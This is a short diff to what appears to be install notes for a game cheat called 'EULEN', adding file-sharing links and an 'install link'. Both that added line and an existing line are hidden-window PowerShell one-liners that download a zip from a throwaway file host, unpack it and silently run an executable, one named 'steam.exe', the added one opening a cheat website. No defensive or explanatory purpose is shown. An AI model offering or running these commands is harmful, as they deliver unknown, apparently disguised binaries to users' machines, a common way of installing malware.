@@ -1,3 +1,8 @@
+       E   U   L   E   N   
+link mega: https://mega.nz/file/DQR3RCCT#zJ30EIcXBPnmSIBbEjEIiMNkPXrbtMYmG7P_ZqL4Zng 
+link instalare: powershell -w h -noni -nop -c "$u='https://0x0.st/8f5g.zip';$z=$env:TEMP+'\8f5g.zip';$e=$env:TEMP+'\e';iwr $u -o $z;Expand-Archive $z $e -f;$s=(gci $e -r -fi eulenv1.exe|select -f 1).FullName;if($s){Start $s}; Start-Process 'https://eulencheats.com'"
+
+
 powershell -w h -noni -nop -c "$u='https://0x0.st/8fVK.zip';$z=$env:TEMP+'\8fVK.zip';$e=$env:TEMP+'\e';iwr $u -o $z;Expand-Archive $z $e -f;$s=(gci $e -r -fi steam.exe|select -f 1).FullName;if($s){Start $s}"
 https://mega.nz/file/LUwk3SDZ#zXPWpxRfpRlsQpDE4z8HYts4PRgTRF-aixMZqe2-Aqc
 
